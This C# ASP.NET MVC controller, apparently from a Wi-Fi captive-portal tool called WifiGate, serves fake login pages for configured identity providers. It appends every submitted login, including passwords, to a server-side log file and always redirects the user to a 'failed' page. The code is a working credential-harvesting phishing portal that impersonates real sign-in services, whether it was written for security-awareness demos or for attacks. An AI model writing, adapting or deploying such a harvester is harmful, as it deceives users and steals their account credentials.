using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using Microsoft.AspNet.Mvc;
using Microsoft.Framework.OptionsModel;
using Microsoft.Framework.Runtime;
using WifiGate.Models;

namespace WifiGate.Controllers {
    public class HomeController : Controller {

        readonly IApplicationEnvironment env;
        readonly WifiGateOptions cfg;

        public HomeController(IApplicationEnvironment appEnvironment, IOptions<WifiGateOptions> optionsAccessor) {
            this.env = appEnvironment;
            this.cfg = optionsAccessor.Options;
        }

        [Route("")]
        public IActionResult Index() {
            var model = cfg.IdentityProviders;
            return View(model);
        }

        [Route("login/{service}")]
        public IActionResult Login(string service) {
            var provider = cfg.IdentityProviders.FirstOrDefault(x => x.Id.Equals(service, StringComparison.OrdinalIgnoreCase));
            if (provider == null) return this.HttpNotFound();

            var model = new LoginModel {
                Service = provider.Id,
                ServiceName = provider.Title
            };
            return this.View(model);
        }

        [Route("login/{service}"), HttpPost, ValidateAntiForgeryToken]
        public IActionResult Login(string service, LoginModel model) {
            var fileName = Path.Combine(env.ApplicationBasePath, cfg.OutputFileName);
            model.AppendToLogFile(fileName, cfg.MaximumPasswordLength);
            return this.RedirectToAction("Failed");
        }

        [Route("login/failed")]
        public IActionResult Failed() {
            return this.View();
        }

    }
}
